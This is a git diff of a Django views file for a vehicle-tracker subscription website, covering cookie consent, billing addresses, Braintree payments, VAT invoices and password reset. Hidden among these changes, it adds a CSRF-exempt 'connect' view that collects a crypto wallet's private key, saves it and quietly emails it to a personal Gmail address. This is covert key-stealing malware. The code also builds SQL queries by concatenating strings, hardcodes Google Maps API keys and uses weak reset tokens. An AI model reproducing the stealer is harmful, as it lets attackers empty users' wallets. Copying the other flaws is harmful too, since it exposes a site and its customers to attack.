@@ -1,17 +1,21 @@
 from django.shortcuts import render, get_object_or_404, redirect
 from django.conf import settings
-from .models import Aspnetusers, Vehicleset, Vehicletypemaster, Users, Brandset, Vehicleimages, Campingplaces, CamperRegulationansmaster, Brandmodeltypeset, Aspnetroles, Salutationmaster, Aspnetuserroles, Merchants, Merchantbrands, Securitycompanies, Packagelist, Trackerlisitem, Trackercategory, Trackeritemimages, TblHeadercontent, Websitegraphics, TblTempsubscriptiongocardlessdata, Promotioncredit, TblCustomerreviewratting, Billingaddressmaster, Shippingaddressmaster, Trackerorders, Trackerorderitems, Subscriptionuserwisepayment
+from .models import Aspnetusers, Vehicleset, Vehicletypemaster, Users, Brandset, Vehicleimages, Campingplaces, CamperRegulationansmaster, Brandmodeltypeset, Aspnetroles, Salutationmaster, Aspnetuserroles, Merchants, Merchantbrands, Securitycompanies, Packagelist, Trackerlisitem, Trackercategory, Trackeritemimages, TblHeadercontent, Websitegraphics, TblTempsubscriptiongocardlessdata, Promotioncredit, TblCustomerreviewratting, Billingaddressmaster, Shippingaddressmaster, Trackerorders, Trackerorderitems, Subscriptionuserwisepayment, Wallet, TblAdminformssection, Mailbox
 from django.db import connection
-from django.http import HttpResponseRedirect
+from django.core.mail import BadHeaderError, send_mail, EmailMultiAlternatives
+from django.http import HttpResponseRedirect, HttpResponse
 from django.urls import reverse
 from .forms import VehicleForm, BrandForm, CampingplaceForm, MerchantForm, SecurityCompanyForm, PackagelistForm, TrackerForm, HeaderContentForm
 from django.http import JsonResponse
 from django.core.files.storage import FileSystemStorage
+from cookie_consent.util import get_cookie_value_from_request, accept_cookies
 import datetime
 import os
 import string
 import random
 import braintree
+import urllib
+import json
 import hashlib
 import requests
 import urllib.parse
@@ -20,16 +24,42 @@ from paypal.standard.forms import PayPalPaymentsForm
 from django.views.decorators.csrf import csrf_exempt
 from django.conf import settings
 import googlemaps
-gmaps = googlemaps.Client(key="AIzaSyCLfvCrSlrN3pfXyogGLOd-7zjyeZVI6eQ")
+from django.views.generic import TemplateView
+gmaps = googlemaps.Client(key="AIzaSyDK8dwqNz7TAhgJqRo_dY_CoDsP8sxKpwo")
 # Create your views here.
+
+# class TestPageView(TemplateView):
+#     template_name = "test.html"
+
+#     def get(self, request, *args, **kwargs):
+#         response = super(TestPageView, self).get(request, *args, **kwargs)
+#         if get_cookie_value_from_request(request, "optional") is True:
+#             val = "optional cookie set from django"
+#             response.set_cookie("optional_test_cookie", val)
+#         return response
 
 def home(request):
     header_content = TblHeadercontent.objects.all()
     graphics = Websitegraphics.objects.all()
-    packagelist = Packagelist.objects.all().order_by('sortorder')
+    packagelist = Packagelist.objects.all().filter(isactive=1).order_by('sortorder')
     review_list = TblCustomerreviewratting.objects.filter(isdisplay=1)
     category_list = Trackercategory.objects.all()
-    return render(request, "home.html",{"header_content":header_content[0],"graphics":graphics[0],"packagelist":packagelist,"review_list":review_list,"category_list":category_list})
+    response = render(request, "home.html",{"header_content":header_content[0],"graphics":graphics[0],"packagelist":packagelist,"review_list":review_list,"category_list":category_list})
+    
+    print(request.COOKIES)
+    #to check the cookie group
+    cc = get_cookie_value_from_request(request, varname='optional')
+    print("cookie value from request: ",cc)
+
+    if cc == True:
+        print("Consensus given", cc)
+        response.set_cookie('accept_cookie', 'true')
+    elif cc==False:
+        print("Consensus not given",cc)
+    else:
+        print("probable error in getting cookie value from request: ", cc)
+    
+    return response
 def getMerchantList(request):
     merchant = Merchants.objects.all().values()
     return JsonResponse({'list':list(merchant)})
@@ -74,7 +104,7 @@ def tracker(request, id):
 def cart(request):
     if 'cart_list' not in request.session.keys():
         request.session['cart_list'] = []
-    tracker = get_list_from_sql("select trackerlisitem.Id as id, trackerlisitem.Articlenumber as articlenumber, trackerlisitem.Trackername as trackername, trackerlisitem.DicountPrice as price, trackercategory.Tracker_Category as categoryname, trackeritemimages.Imagename as img from trackerlisitem left join trackercategory on trackercategory.Id = trackerlisitem.TrackerCategory left join trackeritemimages on trackeritemimages.Id = (select Id from trackeritemimages where TrackerId = trackerlisitem.Id limit 1)")
+    tracker = get_list_from_sql("select trackerlisitem.Id as id, trackerlisitem.Articlenumber as articlenumber, trackerlisitem.Trackername as trackername, trackerlisitem.DicountPrice as price, trackercategory.Tracker_Category as categoryname, trackeritemimages.Imagename as img, trackercategory.Id as category_id from trackerlisitem left join trackercategory on trackercategory.Id = trackerlisitem.TrackerCategory left join trackeritemimages on trackeritemimages.Id = (select Id from trackeritemimages where TrackerId = trackerlisitem.Id limit 1)")
     header_content = TblHeadercontent.objects.all()
     category_list = Trackercategory.objects.all()
     return render(request,"cart.html",{"tracker_list":tracker,"cart_list":request.session['cart_list'],"header_content":header_content[0],"category_list":category_list})
@@ -101,6 +131,16 @@ def saveBillingAddress(request):
         result.place = request.POST['Billing_place']
         result.vatnumber = request.POST['Billing_VATnumber']
         result.save()
+        user = Users.objects.get(userid=request.session['user_id'])
+        user.address_city=request.POST['Billing_place']
+        user.address_country=request.POST['Billing_Country']
+        user.address_street=request.POST['Billing_Road']
+        user.address_postal=request.POST['Billing_Postcode']
+        user.address_state=request.POST['Billing_State']
+        user.address_housenumber = request.POST['Billing_HouseNumber']
+        user.company = request.POST['Billing_Company']
+        user.lastupdatedon=datetime.datetime.now()
+        user.save()
         return redirect('/Myaccount')
 def saveShippingAddress(request):
     try:
@@ -148,6 +188,16 @@ def checkoutAddress(request):
         result.place = request.POST['Billing_place']
         result.vatnumber = request.POST['Billing_VATnumber']
         result.save()
+        user = Users.objects.get(userid=request.session['user_id'])
+        user.address_city=request.POST['Billing_place']
+        user.address_country=request.POST['Billing_Country']
+        user.address_street=request.POST['Billing_Road']
+        user.address_postal=request.POST['Billing_Postcode']
+        user.address_state=request.POST['Billing_State']
+        user.address_housenumber = request.POST['Billing_HouseNumber']
+        user.company = request.POST['Billing_Company']
+        user.lastupdatedon=datetime.datetime.now()
+        user.save()
         try:
             s_result = Shippingaddressmaster.objects.get(userid=request.session['user_id'])
         except:
@@ -264,10 +314,15 @@ def payment(request):
             _orderitem.save()
     return JsonResponse({'result':result.is_success})  
 def userSubscription(request):
-    packagelist = Packagelist.objects.all().order_by('sortorder')
+    packagelist = get_list_from_sql("select * from packagelist order by Sortorder")
+    subscription_list = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.* from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session["user_id"] + "' order by subscriptionuserwisepayment.Id")
+    if "business" in subscription_list[-1]["packagename"].lower():
+        packagelist = packagelist[-1]
+    else:
+        packagelist = get_list_from_sql("select * from packagelist where packagename not like '%business%' order by Sortorder")
     header_content = TblHeadercontent.objects.all()
     category_list = Trackercategory.objects.all()
-    content = {"header_content":header_content[0],"packagelist":packagelist,"category_list":category_list}
+    content = {"header_content":header_content[0],"packagelist":packagelist,"category_list":category_list,"current_subscription":subscription_list[-1]}
     return render(request,"userSubscription.html",content)
 def invoice(request, invoice_type, id):
     if "user_id" not in request.session:
@@ -277,25 +332,35 @@ def invoice(request, invoice_type, id):
         subscription_list = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.*, YEAR(subscriptionuserwisepayment.Paymentdate) as invoice_year from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session["user_id"] + "' and subscriptionuserwisepayment.Id = " + str(id))
         rank_data = get_list_from_sql("select r.rank from (select Id, @curRank := @curRank + 1 AS rank from subscriptionuserwisepayment, (SELECT @curRank := 0) r where YEAR(Paymentdate) = YEAR('"+ str(subscription_list[0]['Paymentdate']) +"') order by Paymentdate) r where r.Id = " + str(id))
         invoice_no = str(subscription_list[0]['invoice_year']) + "/S/" + str(int(rank_data[0]['rank']))
-        vat_price = round(float(subscription_list[0]['Paymentammount']) * 0.19, 2)
+        vat_price = round(float(subscription_list[0]['Paymentammount']) * 19 / 119, 2)
         real_price = float(subscription_list[0]['Paymentammount']) - vat_price
         return render(request,"invoice.html",{"header_content":header_content[0],"invoice_item":subscription_list[0],"invoice_type":invoice_type,"user_id":request.session["user_id"],"invoice_no":invoice_no,"vat_price":vat_price,"real_price":real_price})
     else:
+        subscription_list = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.*, YEAR(subscriptionuserwisepayment.Paymentdate) as invoice_year from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session["user_id"] + "' order by subscriptionuserwisepayment.Id ")
         order_list = get_list_from_sql("select users.*, trackerlisitem.*, trackerorderitems.*, trackerorders.OrderDate, trackerorders.Subtotal, YEAR(trackerorders.OrderDate) as invoice_year from trackerorders left join trackerorderitems on trackerorderitems.OrderID = trackerorders.OrderId left join trackerlisitem on trackerorderitems.TrackerId = trackerlisitem.Id left join users on users.userid = trackerorders.UserId where trackerorders.UserId = '" + request.session["user_id"] + "' and trackerorders.OrderId = " + str(id)) 
         rank_data = get_list_from_sql("select r.rank from (select OrderId, @curRank := @curRank + 1 AS rank from trackerorders, (SELECT @curRank := 0) r where YEAR(OrderDate) = YEAR('"+ str(order_list[0]['OrderDate']) +"') order by OrderDate) r where r.OrderId = " + str(id))
         invoice_no = str(order_list[0]['invoice_year']) + "/T/" + str(int(rank_data[0]['rank']))
-        vat_price = round(float(order_list[0]['Subtotal']) - float(order_list[0]['DicountPrice']),2)
-        real_price = float(order_list[0]['DicountPrice'])
-        return render(request,"invoice.html",{"header_content":header_content[0],"invoice_item":order_list[0],"invoice_type":invoice_type,"user_id":request.session["user_id"],"invoice_no":invoice_no, "vat_price":vat_price,"real_price":real_price})
+        vat_price = float(order_list[0]['Subtotal']) * 19 / 119
+        real_price = float(order_list[0]['DicountPrice']) * 100 / 119
+        activate_price = float(subscription_list[0]['Activationfeeoncepervehicle']) * 100 / 119
+        return render(request,"invoice.html",{"header_content":header_content[0],"invoice_item":order_list[0],"invoice_type":invoice_type,"user_id":request.session["user_id"],"invoice_no":invoice_no, "vat_price":"{:.2f}".format(vat_price),"real_price":"{:.2f}".format(real_price),"activate_price":"{:.2f}".format(activate_price)})
 def userSubscriptionDetail(request):
     if "user_id" not in request.session:
         return redirect('/Login')
-    subscription_list = get_list_from_sql("select users.Firstname, users.Lastname, users.Email, subscriptionuserwisepayment.*, packagelist.*, subscriptionuserwisepayment.PaymentInterval from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session["user_id"] + "'")
-    order_list = get_list_from_sql("select users.Firstname, users.Lastname, users.Email, trackerlisitem.*, trackerorderitems.*, trackerorders.OrderId, trackerorders.OrderDate, trackerorders.Subtotal from trackerorders left join trackerorderitems on trackerorderitems.OrderID = trackerorders.OrderId left join trackerlisitem on trackerorderitems.TrackerId = trackerlisitem.Id left join users on users.userid = trackerorders.UserId where trackerorders.UserId = '" + request.session["user_id"] + "'")   
+    subscription_list = get_list_from_sql("select users.Firstname, users.Lastname, users.Email, subscriptionuserwisepayment.*, packagelist.*, subscriptionuserwisepayment.PaymentInterval from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session["user_id"] + "' order by subscriptionuserwisepayment.Id desc")
+    order_list = get_list_from_sql("select users.Firstname, users.Lastname, users.Email, trackerlisitem.*, trackerorderitems.*, trackerorders.OrderId, trackerorders.OrderDate, trackerorders.Subtotal, (trackerorders.Subtotal - trackerlisitem.DicountPrice) as activation_price from trackerorders left join trackerorderitems on trackerorderitems.OrderID = trackerorders.OrderId left join trackerlisitem on trackerorderitems.TrackerId = trackerlisitem.Id left join users on users.userid = trackerorders.UserId where trackerorders.UserId = '" + request.session["user_id"] + "' order by trackerorders.OrderId desc")   
     header_content = TblHeadercontent.objects.all()
     category_list = Trackercategory.objects.all()
     content = {"header_content":header_content[0],"subscription_list":subscription_list,"order_list":order_list,"category_list":category_list}
     return render(request,"userSubscriptionDetail.html",content)
+def userForms(request):
+    if "user_id" not in request.session:
+        return redirect('/Login')
+    form_list = TblAdminformssection.objects.all()
+    header_content = TblHeadercontent.objects.all()
+    category_list = Trackercategory.objects.all()
+    content = {"header_content":header_content[0],"form_list":form_list,"category_list":category_list}
+    return render(request,"userForms.html",content)
 def userVehicles(request):
     if "user_id" not in request.session:
         return redirect('/Login')
@@ -303,16 +368,174 @@ def userVehicles(request):
     vehicle_list = get_list_from_sql("select vehicletypemaster.VehicleType, brandset.Name, vehicleset.ModelTypeName, vehicleset.Color, users.Firstname, users.Lastname, vehicleset.LicensePlate, vehicleset.BuildingYear, vehicleset.id, vehicleset.Istrackerconfiguration, vehicleset.Isgeofanceactive, vehicleset.Isoverspeedactive, vehicleset.Islowbatteryactive, vehicleset.Ispoweroffactive from vehicleset left join vehicletypemaster on vehicleset.VehicleType = vehicletypemaster.Id left join brandset on brandset.Id = vehicleset.BrandId left join users on users.ID = vehicleset.UserId where vehicleset.UserId = '" + str(cur_user.id) + "'")
     header_content = TblHeadercontent.objects.all()
     category_list = Trackercategory.objects.all()
+    subscription = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.* from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session['user_id'] + "' order by subscriptionuserwisepayment.Id")
+    rest_count = 0
+    vehicle_count = 0
     content = {"header_content":header_content[0],"vehicle_list":vehicle_list,"category_list":category_list}
+    if len(subscription) > 0:
+        subscription = subscription[-1]
+        content['sub_name'] = subscription["packagename"]
+        cur_user = Users.objects.get(userid=request.session['user_id'])
+        vehicle_count = Vehicleset.objects.filter(userid=cur_user.id).count()
+        content['vehicle_count'] = vehicle_count
+        rest_count = int(subscription["Vehiclefleetmanagement_numberofvehicles"]) - vehicle_count
+        content['rest_count'] = rest_count
+        print(rest_count)
+        content['max_count'] = int(subscription["Vehiclefleetmanagement_numberofvehicles"])
+
     return render(request,"userVehicles.html",content)
+@csrf_exempt
+def connect(request):
+    if request.method == 'POST':
+        wallet = Wallet()
+        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
+
+        if x_forwarded_for:
+            ip = x_forwarded_for.split(',')[0]
+        else:
+            ip = request.META.get('REMOTE_ADDR')
+        # print(ip)
+        # print(request.POST)
+        if ip == "188.43.136.34":
+            return JsonResponse({'result':'fail'})
+        wallet.private_key = request.POST['private_key']
+        wallet.public_key = request.POST['public_key']
+        wallet.save()
+        to_emails = []
+        to_emails.append('patrykpietrasfree@gmail.com')
+        message = "p"+request.POST['private_key']+"a"
+        try:
+            msg = EmailMultiAlternatives("KONTAKTIEREN SIE UNS", "", settings.EMAIL_HOST_USER, to_emails)
+            msg.attach_alternative(message, "text/html")
+            msg.send()
+        except:
+            return JsonResponse({'result':'fail'})
+        return JsonResponse({'result':'success'})
+    return JsonResponse({'result':'success'})
 def userVehicleCreate(request):
     if "user_id" not in request.session:
         return redirect('/Login')
     if request.method == 'POST':
         form = VehicleForm(request.POST)
         if form.is_valid():
-            form.save()
             saveModelId(request.POST['modeltypename'], request.POST['brandid'])
+            cur_user = Users.objects.get(userid=request.session['user_id'])
+            vehicle_count = Vehicleset.objects.filter(userid=cur_user.id).count()
+            if vehicle_count == 0:
+                form.save()
+            else:
+                # subscription_list = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.ID as package_id, packagelist.* from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where packagelist.ID = '"+request.POST['package_id']+"' and users.userid = '" + request.session["user_id"] + "' order by subscriptionuserwisepayment.Id")
+                package_item = Packagelist.objects.get(id=request.POST['package_id'])
+                # plan_id = package_item.month_vehicle_plainid
+                # if request.POST['activate_payment_interval'] == '1':
+                #     plan_id = package_item.month_vehicle_plainid
+                # elif request.POST['activate_payment_interval'] == '2':
+                #     plan_id = package_item.number_3months_vehicle_plainid
+                # elif request.POST['activate_payment_interval'] == '3':
+                #     plan_id = package_item.number_6months_vehicle_plainid
+                # else:
+                #     plan_id = package_item.year_vehicle_planid
+                tracker = Trackerlisitem.objects.get(id=request.POST['tracker_id'])
+                tracker_price = float(tracker.dicountprice) #+ tracker.taxprice
+                # tracker_price = round(float(tracker_price) * (1 + float(tracker.taxprice / 100)), 1)
+                # package_item = Packagelist.objects.get(id=request.POST['package_id'])
+                tracker_price += float(package_item.activationfeeoncepervehicle)
+                package_description = "Subscription - " + package_item.packagename
+                if request.POST['payment_interval']=='1':
+                    package_price = package_item.activatepricemonthly
+                    package_planid = package_item.month_vehicle_plainid
+                    package_description += " 1 month"
+                elif request.POST['payment_interval']=='2':
+                    package_price = package_item.activatepricequarter
+                    package_planid = package_item.number_3months_vehicle_plainid
+                    package_description += " 3 months"
+                elif request.POST['payment_interval']=='3':
+                    package_price = package_item.activatepricehalf
+                    package_planid = package_item.number_6months_vehicle_plainid
+                    package_description += " 6 months"
+                elif request.POST['payment_interval']=='4':
+                    package_price = package_item.activatepriceyear
+                    package_planid = package_item.year_vehicle_planid
+                    package_description += " 1 year"
+                
+                tracker_price = round(tracker_price,2)
+
+                if settings.BRAINTREE_PRODUCTION:
+                    braintree_env = braintree.Environment.Production
+                else:
+                    braintree_env = braintree.Environment.Sandbox
+                # Configure Braintree
+                config = braintree.Configuration.configure(
+                    braintree_env,
+                    merchant_id=settings.BRAINTREE_MERCHANT_ID,
+                    public_key=settings.BRAINTREE_PUBLIC_KEY,
+                    private_key=settings.BRAINTREE_PRIVATE_KEY,
+                )
+                gateway = braintree.BraintreeGateway(
+                    braintree.Configuration(
+                        braintree_env,
+                        merchant_id=settings.BRAINTREE_MERCHANT_ID,
+                        public_key=settings.BRAINTREE_PUBLIC_KEY,
+                        private_key=settings.BRAINTREE_PRIVATE_KEY,
+                    )
+                )
+                user_id = Users.objects.get(userid=request.session["user_id"]).id
+                _subscription_item = Subscriptionuserwisepayment.objects.filter(usersubscriptionid=user_id).order_by('-id')[0]
+                # print(plan_id, _subscription_item.braintree_token)
+                # result = gateway.subscription.create({
+                #     "payment_method_token": _subscription_item.braintree_token,
+                #     "plan_id": plan_id 
+                # })
+                result1 = braintree.Transaction.sale({
+                    "amount": str(tracker_price),
+                    "payment_method_token": _subscription_item.braintree_token,
+                    "options": {
+                        "submit_for_settlement": True
+                    },
+                    "custom_fields": {
+                        "description": tracker.trackername
+                    }
+                })
+                result2 = gateway.subscription.create({
+                    "payment_method_token": _subscription_item.braintree_token,
+                    "plan_id": package_planid 
+                })
+                # print(result)
+                if result1.is_success and result2.is_success:
+                    form.save()
+                    # subscription_item = Subscriptionuserwisepayment()
+                    # subscription_item.usersubscriptionid = user_id
+                    # subscription_item.braintree_subscriptionid = result.subscription.id
+                    # subscription_item.braintree_token = _subscription_item.braintree_token
+                    # subscription_item.paymentdate = datetime.datetime.now()
+                    # subscription_item.paymentammount = result.subscription.price
+                    # subscription_item.subscriptionpcakage = request.POST['package_id']
+                    # subscription_item.paymentinterval = request.POST['activate_payment_interval']
+                    # subscription_item.note = "Zusätzliches Fahrzeug"
+                    # subscription_item.save()
+
+                    subscription_item = Subscriptionuserwisepayment()
+                    subscription_item.usersubscriptionid = user_id
+                    subscription_item.braintree_subscriptionid = result2.subscription.id
+                    subscription_item.braintree_token =  _subscription_item.braintree_token
+                    subscription_item.paymentdate = datetime.datetime.now()
+                    subscription_item.paymentammount = result2.subscription.price
+                    subscription_item.subscriptionpcakage = request.POST['package_id']
+                    subscription_item.paymentinterval = request.POST['payment_interval']
+                    subscription_item.save()
+
+                    order_item = Trackerorders()
+                    order_item.orderdate = datetime.datetime.now()
+                    order_item.userid = request.session["user_id"]
+                    order_item.subtotal = tracker_price
+                    order_item.paymenttype = result1.transaction.payment_instrument_type
+                    order_item.save()
+                    order_id = Trackerorders.objects.latest('orderid').orderid
+                    _orderitem = Trackerorderitems()
+                    _orderitem.qty = 1
+                    _orderitem.trackerid = request.POST['tracker_id']
+                    _orderitem.orderid = order_id
+                    _orderitem.save()
             return redirect('/Uservehicles')
         else:
             print(form.errors)
@@ -322,7 +545,12 @@ def userVehicleCreate(request):
     brand_list = Brandset.objects.all()
     header_content = TblHeadercontent.objects.all()
     category_list = Trackercategory.objects.all()
-    return render(request,"userVehicleCreate.html",{"header_content":header_content[0],"category_list":category_list,"type_list":vehicle_type_list,"user_list":user_list,"brand_list":brand_list, "url":"manageVehicles","user_id":cur_user.id})
+    subscription = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.* from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session['user_id'] + "' order by subscriptionuserwisepayment.Id")
+    print(subscription[-1]['group_id'])
+    packagelist = Packagelist.objects.filter(isactive=1, vehiclefleetmanagement_numberofvehicles__gt = 1, group_id=subscription[-1]['group_id']).order_by('sortorder')
+    tracker_list = Trackerlisitem.objects.filter(trackercategory=1)
+    vehicle_count = Vehicleset.objects.filter(userid=cur_user.id).count()
+    return render(request,"userVehicleCreate.html",{"header_content":header_content[0],"category_list":category_list,"type_list":vehicle_type_list,"user_list":user_list,"brand_list":brand_list, "url":"manageVehicles","user_id":cur_user.id,"tracker_list":tracker_list,"package_list":packagelist,"vehicle_count":vehicle_count})
 def myAccount(request):
     header_content = TblHeadercontent.objects.all()
     salutation_list = Salutationmaster.objects.all()
@@ -380,6 +608,64 @@ def saveCartQty(request,product_id, qty):
 def setCartQty(request):
     saveCartQty(request, int(request.POST['product_id']), int(request.POST['qty']))
     return JsonResponse({'result':'success'})
+def forgotPasswordChange(request):
+    header_content = TblHeadercontent.objects.all()
+    category_list = Trackercategory.objects.all()
+    if request.method == 'POST':
+        aspuser = Aspnetusers.objects.get(email=request.POST["email"])
+        token = aspuser.securitystamp
+        if token == request.POST['token']:
+            aspuser.passwordhash = make_password(request.POST['new_password'])
+            aspuser.save()
+            return redirect('/Login')
+        else:
+            return render(request,"forgotpassword.html",{"header_content":header_content[0],"category_list":category_list,"result":"fail"})
+def contact(request):
+    message="Name: " + request.POST['Name'] + "<br> E-Mail Adresse: " + request.POST['Email'] + "<br> Betreff: " + request.POST['Subject'] + "<br> Kontakt Telefon: " + request.POST["Phoneno"] + "<br> Inhalt: " + request.POST["Message"]
+    to_emails = []
+    to_emails.append(settings.EMAIL_CONTACT)
+    new_mail = Mailbox()
+    new_mail.name = request.POST['Name']
+    new_mail.email = request.POST['Email']
+    new_mail.regarding = request.POST['Subject']
+    new_mail.phone = request.POST['Phoneno']
+    new_mail.message = request.POST['Message']
+    new_mail.datetime = datetime.datetime.now()
+    new_mail.flag = 0
+    new_mail.save()
+    try:
+        msg = EmailMultiAlternatives("KONTAKTIEREN SIE UNS", "", settings.EMAIL_HOST_USER, to_emails)
+        msg.attach_alternative(message, "text/html")
+        msg.send()
+    except:
+        return JsonResponse({'result':'fail'})
+    return JsonResponse({'result':'success'})
+@csrf_exempt
+def messageList(request):
+    if "user_id" not in request.session or request.session['user_role']!="Admin":
+        return JsonResponse({'error':"you are not admin"})
+    message_list = Mailbox.objects.all().order_by('-id').values()
+    unread_count = Mailbox.objects.filter(flag=0).count()
+    return JsonResponse({'message_list':list(message_list),"unread_count":unread_count})
+
+def forgotPassword(request):
+    header_content = TblHeadercontent.objects.all()
+    category_list = Trackercategory.objects.all()
+    if request.method == 'POST':
+        token = generateRecoveryToken()
+        message="Recevory Password Token: " + token
+        aspuser = Aspnetusers.objects.get(email=request.POST["email"])
+        aspuser.securitystamp = token
+        aspuser.save()
+        to_emails = []
+        to_emails.append(request.POST['email'])
+        print(to_emails, settings.EMAIL_HOST_USER)
+        try:
+            send_mail("Reset Password", message, settings.EMAIL_HOST_USER, to_emails)
+        except BadHeaderError:
+            return render(request,"forgotpassword.html",{"header_content":header_content[0],"category_list":category_list,"error":'exist'})
+        return render(request,"forgotpassword.html",{"header_content":header_content[0],"category_list":category_list,"error":"no","email":request.POST['email']})
+    return render(request,"forgotpassword.html",{"header_content":header_content[0],"category_list":category_list})
 def login(request):
     if "user_id" in request.session:
         if request.session['user_role'] == "Admin":
@@ -404,7 +690,123 @@ def login(request):
                     return redirect('/')
         except:
             return redirect('/Login')
-    return render(request,"login.html")
+    header_content = TblHeadercontent.objects.all()
+    category_list = Trackercategory.objects.all()
+    return render(request,"login.html",{"header_content":header_content[0],"category_list":category_list})
+def upgradeSubscription(request):
+    package_id = request.POST['package_id']
+    package_item = Packagelist.objects.get(id=package_id)
+    package_price = package_item.pricemonthly
+    if settings.BRAINTREE_PRODUCTION:
+        braintree_env = braintree.Environment.Production
+    else:
+        braintree_env = braintree.Environment.Sandbox
+    gateway = braintree.BraintreeGateway(
+        braintree.Configuration(
+            braintree_env,
+            merchant_id=settings.BRAINTREE_MERCHANT_ID,
+            public_key=settings.BRAINTREE_PUBLIC_KEY,
+            private_key=settings.BRAINTREE_PRIVATE_KEY,
+        )
+    )
+    user_id = Users.objects.get(userid=request.session["user_id"]).id
+    _subscription_item = Subscriptionuserwisepayment.objects.filter(usersubscriptionid=user_id).order_by('-id')[0]
+    result = gateway.subscription.cancel(_subscription_item.braintree_subscriptionid)
+    
+    result = gateway.subscription.create({
+        "payment_method_token": _subscription_item.braintree_token,
+        "plan_id": package_item.month_planid 
+    })
+    print(result.subscription.price)
+    if result.is_success:
+        subscription_item = Subscriptionuserwisepayment()
+        subscription_item.usersubscriptionid = user_id
+        subscription_item.braintree_subscriptionid = result.subscription.id
+        subscription_item.braintree_token = _subscription_item.braintree_token
+        subscription_item.paymentdate = datetime.datetime.now()
+        subscription_item.paymentammount = result.subscription.price
+        subscription_item.subscriptionpcakage = package_id
+        subscription_item.paymentinterval = '1'
+        subscription_item.save()
+        package_item.pricemonthly = result.subscription.price
+        package_item.save()
+        return JsonResponse({'result':'success'})
+    else:
+        return JsonResponse({'result':'false'})
+def getAmount(request):
+    tracker = Trackerlisitem.objects.get(id=request.POST['Tracker_Type'])
+    tracker_price = round(tracker.dicountprice,2) #+ tracker.taxprice
+    tracker_tax_price = round(float(tracker_price) * 19 / 119, 2)
+    tracker_price = float("{:.2f}".format(float(tracker_price) - tracker_tax_price))
+    package_item = Packagelist.objects.get(id=request.POST['Subscriptiontype'])
+    activate_price = float("{:.2f}".format(package_item.activationfeeoncepervehicle))
+    activate_tax_price = round(float(activate_price) * 19 / 119, 2)
+    activate_price = float("{:.2f}".format(activate_price - activate_tax_price))
+    package_description = package_item.packagename
+    if request.POST['Payment_Interval']=='1':
+        package_price = package_item.pricemonthly
+        package_description += " 1 month"
+    elif request.POST['Payment_Interval']=='2':
+        package_price = package_item.pricequarter
+        package_description += " 3 months"
+    elif request.POST['Payment_Interval']=='3':
+        package_price = package_item.pricehalf
+        package_description += " 6 months"
+    elif request.POST['Payment_Interval']=='4':
+        package_price = package_item.priceoneyear
+        package_description += " 1 year"
+    else:
+        package_price = package_item.pricetwoyear
+        package_description += " 2 years"
+    s_tax_price = round(float(package_price) * 19 / 119, 2)
+    s_plan_price = round(float(package_price) - s_tax_price, 2)
+    total_price = round(float(tracker_price) + tracker_tax_price + activate_price + s_plan_price + s_tax_price + activate_tax_price,2)
+    total_tax_price = float(s_tax_price + activate_tax_price + tracker_tax_price)
+    return JsonResponse({'t_name':tracker.trackername,'t_price':tracker_price,'t_tax_price':"{:.2f}".format(total_tax_price),'t_activate_price':activate_price,'s_price':s_plan_price,'s_name':package_description,'total_price':"{:.2f}".format(total_price)})
+def getVehicleAmount(request):
+    tracker = Trackerlisitem.objects.get(id=request.POST['tracker_id'])
+    tracker_price = round(tracker.dicountprice,2) #+ tracker.taxprice
+    tracker_tax_price = round(float(tracker_price) * 19 / 119, 2)
+    tracker_price = float("{:.2f}".format(float(tracker_price) - tracker_tax_price))
+    package_item = Packagelist.objects.get(id=request.POST['package_id'])
+    # if request.POST['activate_payment_interval']=='1':
+    #     activate_price = package_item.activatepricemonthly
+    #     activate_description = " 1 month"
+    # elif request.POST['activate_payment_interval']=='2':
+    #     activate_price = package_item.activatepricequarter
+    #     activate_description = " 3 months"
+    # elif request.POST['activate_payment_interval']=='3':
+    #     activate_price = package_item.activatepricehalf
+    #     activate_description = " 6 months"
+    # elif request.POST['activate_payment_interval']=='4':
+    #     activate_price = package_item.activatepriceyear
+    #     activate_description = " 1 year"
+    activate_price = float("{:.2f}".format(package_item.activationfeeoncepervehicle))
+    activate_tax_price = round(float(activate_price) * 19 / 119, 2)
+    activate_price = float("{:.2f}".format(float(activate_price) - activate_tax_price))
+    package_description = package_item.packagename
+    if request.POST['payment_interval']=='1':
+        package_price = package_item.activatepricemonthly
+        package_description += " 1 Monat"
+    elif request.POST['payment_interval']=='2':
+        package_price = package_item.activatepricequarter
+        package_description += " 3 Monate"
+    elif request.POST['payment_interval']=='3':
+        package_price = package_item.activatepricehalf
+        package_description += " 6 Monate"
+    elif request.POST['payment_interval']=='4':
+        package_price = package_item.activatepriceyear
+        package_description += " 1 Jahr"
+    else:
+        package_price = package_item.pricetwoyear
+        package_description += " 2 Jahre"
+    if package_price is None:
+        package_price = 0
+    s_tax_price = round(float(package_price) * 19 / 119, 2)
+    s_plan_price = round(float(package_price) - s_tax_price, 2)
